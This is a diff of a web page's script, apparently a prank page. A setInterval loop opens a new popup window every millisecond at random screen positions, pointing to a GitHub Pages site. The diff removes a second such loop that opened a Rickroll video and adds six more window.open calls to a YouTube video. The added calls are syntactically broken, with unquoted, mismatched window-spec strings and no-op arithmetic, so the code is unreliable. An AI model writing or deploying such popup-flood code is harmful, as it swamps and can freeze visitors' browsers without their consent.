@@ -16,12 +16,25 @@ h8 {
 }
 </style>
 <script>
+	var A = 0
+	
+	newWindow = window.open("https://www.youtube.com/watch?v=o-YBDTqX_ZU","test", height=500px, width=500px left=" + A);
+	A + 500;
+	newWindow = window.open("https://www.youtube.com/watch?v=o-YBDTqX_ZU","test", height=500px, width=500px left=" + A);
+	A + 500;
+	newWindow = window.open("https://www.youtube.com/watch?v=o-YBDTqX_ZU","test", height=500px, width=500px left=" + A);
+	A + 500;
+	newWindow = window.open("https://www.youtube.com/watch?v=o-YBDTqX_ZU","test", height=500px, width=500px left=" + A);
+	A + 500;
+	newWindow = window.open("https://www.youtube.com/watch?v=o-YBDTqX_ZU","test", height=500px, width=500px left=" + A);
+	A + 500;
+	newWindow = window.open("https://www.youtube.com/watch?v=o-YBDTqX_ZU","test", height=500px, width=500px left=" + A);
+	A + 500;
+	
 	var newWindow;
 	var cat;
 	var A = 0
-	while (A = 0 )
-		if (event.key === 'space')
-			A = 1
+	
 	
         setInterval(function(){
 	 	var RandomX = (Math.random() * 1024) + 1;
@@ -29,12 +42,7 @@ h8 {
 		var specs = "height=500px, width=500px, left=" + RandomX + ", top=" + RandomY;
 		newWindow = window.open("https://cassius-root.github.io","test", specs);
  	 }, 1);
-	   setInterval(function(){
-	 	var RandomZ = (Math.random() * 1024) + 1;
-	 	var RandomT = (Math.random() * 768) + 300;
-		var specs = "height=500px, width=500px, left=" + RandomZ + ", top=" + RandomT, _blur;
-		cat = window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ","test", specs);
- 	 }, 1);
+	   
 </script>
 </body>
 </html>
